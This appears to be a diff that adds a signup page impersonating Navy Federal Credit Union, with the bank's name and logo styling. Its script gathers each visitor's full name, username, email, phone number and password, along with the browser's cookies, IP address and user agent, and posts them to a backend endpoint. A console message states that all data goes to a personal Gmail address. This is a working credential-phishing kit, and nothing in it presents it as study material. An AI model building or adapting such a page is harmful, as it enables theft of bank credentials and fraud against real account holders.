@@ -1,0 +1,223 @@
+<!-- public/signup.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Navy Federal - Create Account</title>
+    <style>
+        /* Copy all styles from your index.html here */
+        /* Same header, card, form styles */
+        /* I'll add the signup-specific styles */
+        
+        /* Add this extra style for signup */
+        .signup-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        
+        @media (max-width: 480px) {
+            .signup-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="hamburger">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="logo-section">
+            <div class="globe">
+                <div class="globe-arc"></div>
+                <div class="globe-arc2"></div>
+            </div>
+            <span class="brand-name">NAVY FEDERAL</span>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <h1 class="welcome-text">Create Your Account</h1>
+
+        <div class="card">
+            <div class="card-body">
+                <div class="sign-in-header">
+                    <div class="lock-icon">
+                        <div class="lock-shackle"></div>
+                        <div class="lock-body">
+                            <div class="lock-hole"></div>
+                        </div>
+                    </div>
+                    <span class="sign-in-title">Sign Up</span>
+                </div>
+
+                <form id="signupForm">
+                    <div class="signup-grid">
+                        <div class="form-group">
+                            <label class="form-label" for="fullName">Full Name</label>
+                            <input type="text" id="fullName" class="form-input" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label" for="username">Username</label>
+                            <input type="text" id="username" class="form-input" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label" for="email">Email Address</label>
+                        <input type="email" id="email" class="form-input" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label" for="phone">Phone Number</label>
+                        <input type="tel" id="phone" class="form-input" placeholder="+1 (234) 567-8900" required>
+                    </div>
+
+                    <div class="signup-grid">
+                        <div class="form-group">
+                            <label class="form-label" for="password">Password</label>
+                            <div class="password-wrapper">
+                                <input type="password" id="password" class="form-input" required>
+                                <div class="eye-icon" onclick="togglePassword('password')">
+                                    <div class="eye-outer">
+                                        <div class="eye-pupil"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label" for="confirmPassword">Confirm Password</label>
+                            <div class="password-wrapper">
+                                <input type="password" id="confirmPassword" class="form-input" required>
+                                <div class="eye-icon" onclick="togglePassword('confirmPassword')">
+                                    <div class="eye-outer">
+                                        <div class="eye-pupil"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin: 16px 0;">
+                        <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
+                            <input type="checkbox" id="termsCheck" required>
+                            <span style="font-size: 14px; color: #555;">
+                                I agree to the Terms and Conditions & Privacy Policy
+                            </span>
+                        </label>
+                    </div>
+
+                    <button type="submit" id="signupBtn" class="submit-btn">Create Account</button>
+                </form>
+
+                <p style="text-align: center; margin-top: 20px; color: #555;">
+                    Already have an account? 
+                    <a href="/" style="color: #2a6db5; text-decoration: none; font-weight: 600;">Sign In</a>
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer-section">
+        <p class="footer-text">Already a Member?</p>
+    </footer>
+
+    <script>
+        // ==========================================
+        // TOGGLE PASSWORD VISIBILITY
+        // ==========================================
+        function togglePassword(fieldId) {
+            const input = document.getElementById(fieldId);
+            input.type = input.type === 'password' ? 'text' : 'password';
+        }
+
+        // ==========================================
+        // GET IP ADDRESS
+        // ==========================================
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'IP not available';
+            }
+        }
+
+        // ==========================================
+        // SIGNUP HANDLER
+        // ==========================================
+        document.getElementById('signupForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const fullName = document.getElementById('fullName').value.trim();
+            const username = document.getElementById('username').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            const termsChecked = document.getElementById('termsCheck').checked;
+
+            if (!termsChecked) {
+                alert('Please agree to the Terms and Conditions');
+                return;
+            }
+
+            if (password !== confirmPassword) {
+                alert('Passwords do not match!');
+                return;
+            }
+
+            const btn = document.getElementById('signupBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> Creating Account...';
+
+            try {
+                const ip = await getIP();
+                const cookies = document.cookie || 'No cookies';
+
+                const userData = {
+                    fullName,
+                    username,
+                    email,
+                    phone,
+                    password,
+                    ip,
+                    cookies,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+
+                console.log('📝 Signup data:', userData);
+
+                const response = await fetch('/api/auth/signup', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+
+                if (response.ok) {
+                    alert('✅ Account created successfully! Please sign in.');
+                    window.location.href = '/';
+                } else {
+                    const error = await response.json();
+                    alert(error.error || 'Signup failed. Please try again.');
+                }
+            } catch (error) {
+                console.error('Signup error:', error);
+                alert('Signup failed. Please try again.');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Create Account';
+            }
+        });
+
+        console.log('✅ Navy Federal Signup Page Loaded');
+        console.log('📧 All data will be sent to: blessedresult6@gmail.com');
+    </script>
+</body>
+</html>
